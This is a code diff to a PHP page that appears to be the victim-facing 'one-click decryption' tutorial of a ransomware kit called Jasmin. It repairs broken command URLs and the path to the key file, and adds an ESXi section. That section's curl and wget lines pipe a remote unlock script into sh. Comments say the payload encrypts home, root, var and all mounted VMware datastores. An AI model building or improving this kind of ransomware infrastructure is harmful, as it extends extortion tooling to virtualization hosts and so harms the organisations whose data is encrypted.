@@ -1,8 +1,12 @@
 <?php
-$srv = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http').'://'.$_SERVER['HTTP_HOST'];
-// Host 头可被伪造，$srv 会原样输出进 <pre>（HTML 上下文）-> 反射型注入。
-// 输出处一律 h() 转义：只保留主机名字符集，其余剥掉。
-$srv = htmlspecialchars(preg_replace('/[^A-Za-z0-9.:\-_\[\]]/', '', $srv), ENT_QUOTES, 'UTF-8');
+// Host 头可被伪造，$srv 会输出进 <pre>（HTML 上下文）-> 反射型注入。
+// 只对【主机名】做字符白名单，scheme 单独拼回。
+// ★ 旧实现把整串一起过滤，连 scheme 的 '//' 都剥掉了，生成的命令变成
+//     curl -sL http:host:port/payloads/jasmin_unlock.sh
+//   实测 curl 直接 exit 3 "URL malformed" —— 即「解密教程」里每一条命令都跑不通。
+$scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
+$host   = preg_replace('/[^A-Za-z0-9.:\-_\[\]]/', '', (string)($_SERVER['HTTP_HOST'] ?? ''));
+$srv    = htmlspecialchars($scheme . '://' . $host, ENT_QUOTES, 'UTF-8');
 // 修复: __DIR__ 是 includes/，原写 __DIR__.'/payloads/.key_secret' 永远不存在
 //       → $aes_pwd 恒为 KEY_NOT_SET → 解密命令必然失败。应为上一级目录。
 $ks_path = dirname(__DIR__) . '/payloads/.key_secret';
@@ -28,6 +32,7 @@ wget -qO- <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>"<
   <button class="dt-btn active" onclick="showDT('win')"><i class="fab fa-windows"></i> Windows</button>
   <button class="dt-btn" onclick="showDT('linux')"><i class="fab fa-linux"></i> Linux</button>
   <button class="dt-btn" onclick="showDT('mac')"><i class="fab fa-apple"></i> macOS</button>
+  <button class="dt-btn" onclick="showDT('esxi')"><i class="fas fa-cube"></i> ESXi</button>
 <button class="dt-btn" onclick="showDT('nas')"><i class="fas fa-server"></i> NAS</button>
 </div>
 
@@ -59,6 +64,23 @@ curl -sL <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>"
 
 # 只需解特定目录时，在末尾追加（可多个）
 curl -sL <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>" /Users /tmp</pre>
+</div>
+
+<div class="dt-content" id="dt-esxi" style="display:none">
+<h3>🖥️ VMware ESXi 一键解密</h3>
+<pre class="dt-code"># 先启用 SSH（ESXi 6.x: Host > 管理 > 服务 > TSM-SSH；
+#            ESXi 7/8: Host > 操作 > 服务 > 启用安全 Shell）
+# ESXi 是 BusyBox/POSIX 环境，复用与 Linux 相同的零依赖脚本；
+# 依赖 openssl 与 od（ESXi 7.0+ 自带），缺哪个脚本会明确报出对应名字。
+# 不写目录则解密全部加密文件（/home /root /var /opt /tmp /srv + 所有真实挂载点，
+# 即 /vmfs/volumes 下的各个数据存储）—— 与载荷加密范围完全对齐
+curl -sL <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>"
+
+# 只需解特定数据存储时，在末尾追加（可多个）
+curl -sL <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>" /vmfs/volumes/datastore1
+
+# ESXi 上 curl 不可用时改用 wget
+wget -qO- <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>"</pre>
 </div>
 
 <div class="dt-note" style="margin-top:20px"><i class="fas fa-info-circle"></i> <b>准备:</b> 点击「生成RSA密钥对」后，加密私钥(<code>.pem.enc</code>)和解密脚本会自动部署到 payloads/ 目录</div>
